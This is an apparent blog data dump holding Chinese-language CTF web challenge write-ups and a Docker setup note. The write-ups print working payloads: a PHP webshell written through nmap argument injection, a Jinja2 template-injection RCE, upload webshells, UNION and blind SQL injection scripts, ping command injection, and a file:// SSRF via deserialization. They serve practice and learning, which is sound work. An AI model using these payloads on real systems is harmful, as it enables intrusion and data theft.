createBackground(); createPointFlowers(); createPostProcess(); sceneStandBy = true; } function initScene() { initBackground(); initPointFlowers(); initPostProcess(); //camera.position.z = 17.320508; camera.position.z = pointFlower.area.z + projection.nearfar[0]; projection.angle = Math.atan2(pointFlower.area.y, camera.position.z + pointFlower.area.z) * 180.0 / Math.PI * 2.0; Matrix44.loadProjection(projection.matrix, renderSpec.aspect, projection.angle, projection.nearfar[0], projection.nearfar[1]); } function renderScene() { //draw Matrix44.loadLookAt(camera.matrix, camera.position, camera.lookat, camera.up); gl.enable(gl.DEPTH_TEST); //gl.bindFramebuffer(gl.FRAMEBUFFER, null); gl.bindFramebuffer(gl.FRAMEBUFFER, renderSpec.mainRT.frameBuffer); gl.viewport(0, 0, renderSpec.mainRT.width, renderSpec.mainRT.height); gl.clearColor(0.005, 0, 0.05, 0); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); renderBackground(); renderPointFlowers(); renderPostProcess(); } ///// function onResize(e) { makeCanvasFullScreen(document.getElementById(\"sakura\")); setViewports(); if(sceneStandBy) { initScene(); } } function setViewports() { renderSpec.setSize(gl.canvas.width, gl.canvas.height); gl.clearColor(0.2, 0.2, 0.5, 1.0); gl.viewport(0, 0, renderSpec.width, renderSpec.height); var rtfunc = function (rtname, rtw, rth) { var rt = renderSpec[rtname]; if(rt) deleteRenderTarget(rt); renderSpec[rtname] = createRenderTarget(rtw, rth); }; rtfunc('mainRT', renderSpec.width, renderSpec.height); rtfunc('wFullRT0', renderSpec.width, renderSpec.height); rtfunc('wFullRT1', renderSpec.width, renderSpec.height); rtfunc('wHalfRT0', renderSpec.halfWidth, renderSpec.halfHeight); rtfunc('wHalfRT1', renderSpec.halfWidth, renderSpec.halfHeight); } function render() { renderScene(); } var animating = true; function toggleAnimation(elm) { animating ^= true; if(animating) animate(); if(elm) { elm.innerHTML = animating? \"Stop\":\"Start\"; } } function stepAnimation() { if(!animating) animate(); } function animate() { var curdate = new Date(); timeInfo.elapsed = (curdate - timeInfo.start) / 1000.0; timeInfo.delta = (curdate - timeInfo.prev) / 1000.0; timeInfo.prev = curdate; if(animating) requestAnimationFrame(animate); render(); } function makeCanvasFullScreen(canvas) { var b = document.body; var d = document.documentElement; fullw = Math.max(b.clientWidth , b.scrollWidth, d.scrollWidth, d.clientWidth); fullh = Math.max(b.clientHeight , b.scrollHeight, d.scrollHeight, d.clientHeight); canvas.width = fullw; canvas.height = fullh; } window.addEventListener('load', function(e) { var canvas = document.getElementById(\"sakura\"); try { makeCanvasFullScreen(canvas); gl = canvas.getContext('experimental-webgl'); } catch(e) { alert(\"WebGL not supported.\" + e); console.error(e); return; } window.addEventListener('resize', onResize); setViewports(); createScene(); initScene(); timeInfo.start = new Date(); timeInfo.prev = timeInfo.start; animate(); }); //set window.requestAnimationFrame (function (w, r) { w['r'+r] = w['r'+r] || w['webkitR'+r] || w['mozR'+r] || w['msR'+r] || w['oR'+r] || function(c){ w.setTimeout(c, 1000 / 60); }; })(window, 'equestAnimationFrame');"}],"posts":[{"title":"BUUCTF2018-OnlineTool","slug":"BUUCTF2018-OnlineTool","date":"2020-07-15T01:19:00.000Z","updated":"2020-07-15T09:43:45.971Z","comments":true,"path":"2020/07/15/BUUCTF2018-OnlineTool/","link":"","permalink":"http://lingxin16.github.io/2020/07/15/BUUCTF2018-OnlineTool/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 总体意思就是GET方式传递参数给host然后经过两个函数escapeshellarg和escapeshellcmd，最后执行system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host) 函数作用 1,确保用户值传递一个参数给命令 2,用户不能指定更多的参数 3,用户不能执行不同的命令 函数作用 1,确保用户只执行一个命令 2,用户可以指定不限数量的参数 3,用户不能执行不同的命令题目提示给了PHP和RCE 这里关于PHP escapeshellarg()+escapeshellcmd()的RCE漏洞https://paper.seebug.org/164/ 传入的参数是：172.17.0.2&#39; -v -d a=1 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl &#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1&#39;，即向172.17.0.2\\发起请求，POST 数据为a=1&#39;。 接下来就是构造命令 ?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39; 文件路径/c42a72d0bb829f75f501621acb75dc05/shell.php 蚁剑连接后在根目录找到flag nmap中文手册：http://www.nmap.com.cn/doc/manual.shtm","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"RoarCTF2019-EasyJava","slug":"RoarCTF2019-EasyJava","date":"2020-07-14T02:01:00.000Z","updated":"2020-07-15T09:44:44.795Z","comments":true,"path":"2020/07/14/RoarCTF2019-EasyJava/","link":"","permalink":"http://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 这道题做起来又是没有一点思路，除了登录和help两个功能也没找到其他的，也没有隐藏的hint之类的，看报错显示的是Apache Tomcat/8.5.24，我搜下了有一个CVE-2018-1305的漏洞，但是好像也没什么用，还是看大佬们的wp吧😭😭😭 利用点是help功能，点击help之后跳转的是/Download?filename=help.docx，但是报错java.io.FileNotFoundException:{help.docx} 关于这点，看大佬们的博客是因为请求方式的原因，果然改为post请求之后能够正常下载 下载后打开只有一行Are you sure the flag is here? ? ?很显然这也不是flag 接下来就是WEB-INF/web.xml泄露，WEB-INF是Java的WEB应用的安全目录。主要包含以下文件或目录 /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码关于具体的源码泄露参考这个大佬的文章：https://blog.csdn.net/wy_97/article/details/78165051 然后传filename=/WEB-INF/web.xml，下载得到 有一个FlagController，路径/Flag，请求后报错 有路径/com/wm/ctf/FlagController 接下来就是更加看不懂的环节了，推测class文件路径，然后获得class文件，反编译得到flag payload： filename=WEB-INF/classes/com/wm/ctf/FlagController.class 有一串base64样式的字符串，解码得到flag 关于这个路径推测，大佬们的博客写的是结合Tomcat的项目存放路径的经验得出的，咱也没经验，咱也不知道👀","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"BJDCTF2nd-EasyMd5","slug":"BJDCTF2nd-EasyMd5","date":"2020-07-13T02:51:00.000Z","updated":"2020-07-15T09:45:04.855Z","comments":true,"path":"2020/07/13/BJDCTF2nd-EasyMd5/","link":"","permalink":"http://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 在HTTP头里发现Hint: select * from ‘admin’ where password=md5($pass,true) 关于md5($pass,true) 参考：https://blog.csdn.net/March97/article/details/81222922 输入ffifdyop 查看源文件，发现 &lt;!-- $a = $GET[&#39;a&#39;]; $b = $_GET[&#39;b&#39;]; if($a != $b &amp;&amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --&gt; md5 bypass 因为md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过。payload:?a[]=1&amp;b[]=2 POST方式传?param1[]=1&amp;param2[]=2","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"BJDCTF2nd-fakegoogle","slug":"BJDCTF2nd-fakegoogle","date":"2020-07-13T00:32:00.000Z","updated":"2020-07-15T09:45:20.383Z","comments":true,"path":"2020/07/13/BJDCTF2nd-fakegoogle/","link":"","permalink":"http://lingxin16.github.io/2020/07/13/BJDCTF2nd-fakegoogle/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 输入一个值之后返回 查看源文件后发现提示 &lt;!--ssssssti &amp; a little trick --&gt; ssti注入，利用的是jinjia2的模板引擎 payload {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag').read()\") }}{% endif %}{% endfor %} ``` RCE Payload ``` {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('').read()\") }}{% endif %}{% endfor %}推荐文章https://bbs.ichunqiu.com/thread-47685-1-1.html 当然这一题也能用tplmap一把梭","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"ACTF2020新生赛-Upload","slug":"ACTF2020新生赛-Upload","date":"2020-07-11T01:35:00.000Z","updated":"2020-07-15T09:45:38.595Z","comments":true,"path":"2020/07/11/ACTF2020新生赛-Upload/","link":"","permalink":"http://lingxin16.github.io/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 鼠标移动到中间发现上传，尝试上传 上传成功后左上角有提示，可以打开 在尝试上传PHP马的时候提示 在尝试抓包的时候发现，文件后缀的检测是本地前端检测，后缀改为png，利用burp抓包改phtml后缀，上传成功。 蚁剑连接，在根目录找到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"ACTF2020新生赛-BackupFile","slug":"ACTF2020新生赛-BackupFile","date":"2020-07-10T02:49:00.000Z","updated":"2020-07-15T09:45:51.760Z","comments":true,"path":"2020/07/10/ACTF2020新生赛-BackupFile/","link":"","permalink":"http://lingxin16.github.io/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 让我们尝试找源文件，在index.php.bak得到源文件 &lt;?php include_once &quot;flag.php&quot;; if(isset($_GET[&#39;key&#39;])) { $key = $_GET[&#39;key&#39;]; if(!is_numeric($key)) { exit(&quot;Just num!&quot;); } $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) { echo $flag; } } else { echo &quot;Try to find out source file!&quot;; }要求我们传入key值，key值只能是数字，并且key值等于123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3才能得到flag PHP作为弱类型语言，当字符串与整型值比较时，字符串先转换成整型，然后再比较，也就是说只要key=123就能满足。 index.php?key=123得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-upload","slug":"极客大挑战2019-upload","date":"2020-07-09T02:45:00.000Z","updated":"2020-07-15T09:46:36.176Z","comments":true,"path":"2020/07/09/极客大挑战2019-upload/","link":"","permalink":"http://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/","excerpt":"地址:buuctf","text":"地址:buuctf 上传界面 过滤了&lt;?那就尝试不带&lt;?的，前几天遇到过 eval($_POST[a]); 还要满足图片， GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_POST[a]);&lt;/script&gt;PHP后缀的话可以用PHP3、PHP4、phtml绕过，这里只能用phtml 上传文件都在upload目录下，蚁剑连接，在根目录下得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"ZJCTF-NiZhuanSiWei","slug":"ZJCTF-NiZhuanSiWei","date":"2020-07-08T07:42:00.000Z","updated":"2020-07-15T10:02:44.660Z","comments":true,"path":"2020/07/08/ZJCTF-NiZhuanSiWei/","link":"","permalink":"http://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 首先要满足传入一个text文件，使文件内容为welcome to the zjctf，可以用php://input伪协议 ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=接下来过滤了flag，并且提示有个useless.php文件，使用php://filter协议读取 ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php base64解码得道useless.php的内容 &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; 然后序列化 &lt;?php class Flag{ public $file=&#39;flag.php&#39;; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } $password=new Flag(); $password = serialize($password); echo $password; ?&gt;得到O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 最终payload ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}源代码得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-BuyFlag","slug":"极客大挑战2019-BuyFlag","date":"2020-07-07T12:58:00.000Z","updated":"2020-07-15T09:47:18.695Z","comments":true,"path":"2020/07/07/极客大挑战2019-BuyFlag/","link":"","permalink":"http://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/","excerpt":"地址:buuctf","text":"地址:buuctf 随便翻一翻，右边menu菜单有个PayFlag指向pay.php 这里说我们只能用多少钱买flag并且必须是哪里的学生，并且要回答正确的密码 查看源代码发现提示 &lt;!-- ~~~post money and password~~~ if (isset($_POST[&#39;password&#39;])) { $password = $_POST[&#39;password&#39;]; if (is_numeric($password)) { echo &quot;password can&#39;t be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; } } --&gt; 这里的意思是我们需要用post方式提交password，然后password不能是数字，当password等于404的时候返回Password Right! emm既需要满足password不是数字，又要满足password等于404 这里的password类型判断用的is_numeric() 在PHP手册中了解到 bool is_numeric( mixed $var) 如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。 那么如果我们赋值中不仅仅是数字或数字字符串，就是false 这里我们让password=404% 在控制台中还能看到一项cookie：user=0 修改为user=1 已经提示我们you are CuiterPassword Right!Pay for the flag!!!hacker!!! 但是Pay for the flag一直没找到在哪里，那就也直接传一个money吧 但是在这个题中PHP版本是5.3.5，输入字符不能超过八位，否则会提示我们Nember lenth is too long 关于这个我们可以了解一下strcmp()函数 这个函数在PHP5.3版本之前有个漏洞，当我们传入非字符串类型的数据的时候，这个函数将发生错误，在PHP5.3版本之前显示了报错的警告信息后会return 0，也就是虽然报了错，但却判定其相等。 所以我们传money[]=admin","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-BabySQL","slug":"极客大挑战2019-BabySQL","date":"2020-07-06T03:23:00.000Z","updated":"2020-07-15T09:47:29.734Z","comments":true,"path":"2020/07/06/极客大挑战2019-BabySQL/","link":"","permalink":"http://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/","excerpt":"​ 题目地址:buuctf","text":"​ 题目地址:buuctf 尝试admin登录 然后尝试利用admin’or 1 = 1# 显然or被过滤了， 这里用双写绕过admin’oorr 1 = 1#成功 username=u’uniunionon selselectect 1,2,3#&amp;password=p 得到2,3列，接下来爆库得到geek u’uniunionon selselectect 1,2,database()#&amp;password=p username=u’uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#&amp;password=p 得到两个表名’b4bsql,geekuser’ username=u’uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=’geekuser’#&amp;password=p 得到三个字段id,username,password username=u’uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom geekuser#&amp;password=p 没有发现flag 重复操作在b4bsql表中发现flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"CentOS配置docker和docker-compose","slug":"CentOS配置docker和docker-compose","date":"2020-06-25T13:48:00.000Z","updated":"2020-07-15T09:47:48.916Z","comments":true,"path":"2020/06/25/CentOS配置docker和docker-compose/","link":"","permalink":"http://lingxin16.github.io/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/","excerpt":"最近在部署一个web服务，需要docker和docker-compose，遇到了许多问题，记录一下。","text":"最近在部署一个web服务，需要docker和docker-compose，遇到了许多问题，记录一下。 CentOS版本是7.6 先安装docker yum -y install docker然后安装docker-compose(可能会出现错误，建议先看完整篇博客再安装) # yum-util 提供 yum-config-manager 功能， 另外两个是 devicemapper 驱动依赖 yum install -y yum-utils device-mapper-persistent-data lvm2 # 设置 yum 源 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # 安装依赖 yum install epel-release #安装python——pip yum install -y python-pip # 使用pip安装docker-compose pip install docker-compose # 升级python包 sudo yum upgrade python*这是正常的流程，会出现这样的错误 那么需要先安装安装python-devel yum install python-devel -y 然后再安装上边的使用pip安装docker-compose 安装成功之后测试 docker -v docker-compose -v正常之后就没问题了 但是我的docker-compose出现了这样的错误 这个问题我也没什么解决办法，就换一种方法安装docker-compose 安装docker-compose sudo curl -L &quot;https://get.daocloud.io/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose对二进制文件应用可执行权限： chmod +x /usr/local/bin/docker-compose然后再docker-compose -v测试是否正常 如果提示找不到docker-compose，那就配置一下全局环境变量，具体操作在下边 vi /etc/profile然后在末尾添加 export PATH=/usr/local/bin:$PATH最后退出vim 执行source/etc/profile 这时候测试应该就正常了 但是在用docker-compose启动docker集群时报错Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running? 执行systemctl start docker 然后再启动docker集群解决问题 参考文章: https://blog.csdn.net/btqszl/article/details/78528726 https://www.cnblogs.com/caidingyu/p/11320021.html","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"环境配置","slug":"环境配置","permalink":"http://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"ACTF2020新生赛-Exec","slug":"ACTF2020新生赛-Exec","date":"2020-06-22T01:57:00.000Z","updated":"2020-07-15T09:47:59.766Z","comments":true,"path":"2020/06/22/ACTF2020新生赛-Exec/","link":"","permalink":"http://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/","excerpt":"题目地址：buuctf","text":"题目地址：buuctf 题目是长这样子的 emm..看到ping这个功能就想命令执行和管道符漏洞，就先输入127.0.0.1||ls 但是只能看到一个index.php 再看上级目录127.0.0.1||ls / 然后直接127.0.0.1||cat /flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"网鼎杯2018-Fakebook","slug":"网鼎杯2018-Fakebook","date":"2020-06-20T14:27:00.000Z","updated":"2020-07-15T09:48:16.193Z","comments":true,"path":"2020/06/20/网鼎杯2018-Fakebook/","link":"","permalink":"http://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 the Fakebook 有login和join两个选项，join应该是注册，我们先尝试注册 注册成功之后直接登录 username这里可以点进去，进去之后是这样的 url格式是/view.php?no=1，猜测可以进行注入 当我们尝试进行注入的时候，发现有waf，当出现有union select的时候就会被拦截 这里用/**/代替空格进行绕过 /view.php?no=0 union/**/select 1,2,3,4–+的时候回显 /view.php?no=0 union/**/select 1,database(),3,4–+得到数据库名fakebook /view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名user /view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名 /view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据 1d1a05b40f186efa8c4152341eb69a1c8ac32ea0c3d76d6d071427a902ed8ec88c320f54ca1d4e8301a9a43746c74826d2c9113dc30ff93a68e7eda21aa5d94ab4e69O:8:”UserInfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:11:”www.d1a0.cn&quot;;} 这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt robots.txt中存在 User-agent: * Disallow: /user.php.bak下载得到 &lt;?php class UserInfo { public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) {\u0001 return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); } } 构造payload &lt;?php class Userinfo { public $name = &quot;d1a0&quot;; public $age = 111; public $blog = &quot;file:///var/www/html/flag.php&quot;; } $data = new Userinfo(); echo serialize($data); ?&gt; /view.php?no=0 union/**/select 1,2,3,’O:8:”Userinfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’ 看大佬们的博客，还有个非预期解 使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4 太棒了，又学到了许多","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"CISCN2019华北赛区Day2-HackWorld","slug":"CISCN2019华北赛区Day2-HackWorld","date":"2020-06-19T02:23:00.000Z","updated":"2020-07-15T09:48:38.436Z","comments":true,"path":"2020/06/19/CISCN2019华北赛区Day2-HackWorld/","link":"","permalink":"http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 结合提示，是个sql注入类型的题目，尝试注入测试 输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend. 输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result. 能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧 &lt;?php $dbuser=&#39;root&#39;; $dbpass=&#39;root&#39;; function safe($sql){ #被过滤的内容 函数基本没过滤 $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;); foreach($blackList as $blackitem){ if(stripos($sql,$blackitem)){ return False; } } return True; } if(isset($_POST[&#39;id&#39;])){ $id = $_POST[&#39;id&#39;]; }else{ die(); } $db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass); if(!$db){ die(mysql_error()); } mysql_select_db(&quot;ctf&quot;,$db); if(safe($id)){ $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;); if($query){ $result = mysql_fetch_array($query); if($result){ echo $result[&#39;content&#39;]; }else{ echo &quot;Error Occured When Fetch Result.&quot;; } }else{ var_dump($query); } }else{ die(&quot;SQL Injection Checked.&quot;); } 可以看到过滤了空格等很多东西，但是也有很多东西没过滤 因为我能力有限，还是研究师傅们的代码吧 import requests import base64 import sys import string import hashlib import io import time sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;) #改变标准输出的默认编码,否则s.text不能输出 x = string.printable flag = &quot;&quot; url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot; payload={ &quot;id&quot; : &quot;&quot; } for i in range(0,60): for j in x: payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j)) s = requests.post(url,data=payload) #print(s.text) if &quot;Hello&quot; in s.text: flag += j print(flag) break print(flag) 但是这个代码我运行的时候报错，所以删掉了sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;) 能够正常运行，得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"强网杯2019-高明的黑客","slug":"强网杯2019-高明的黑客","date":"2020-06-18T13:54:00.000Z","updated":"2020-07-15T09:49:45.687Z","comments":true,"path":"2020/06/18/强网杯2019-高明的黑客/","link":"","permalink":"http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 网站源码到www.tar.gz以供大家观赏，说明网站源码备份 访问/www.tar.gz 得到一个压缩包 解压缩，得到3002个php文件，3002个…… 我这种菜狗，看到这种，头都要没了 还是看赵师傅的wp吧 https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6 赵师傅的代码 import os import threading from concurrent.futures.thread import ThreadPoolExecutor import requests session = requests.Session() path = &quot;/Users/jinzhao/PhpstormProjects/qwb/web2/&quot; # 文件夹目录 files = os.listdir(path) # 得到文件夹下的所有文件名称 mutex = threading.Lock() pool = ThreadPoolExecutor(max_workers=50) def read_file(file): f = open(path + &quot;/&quot; + file); # 打开文件 iter_f = iter(f); # 创建迭代器 str = &quot;&quot; for line in iter_f: # 遍历文件，一行行遍历，读取文本 str = str + line # 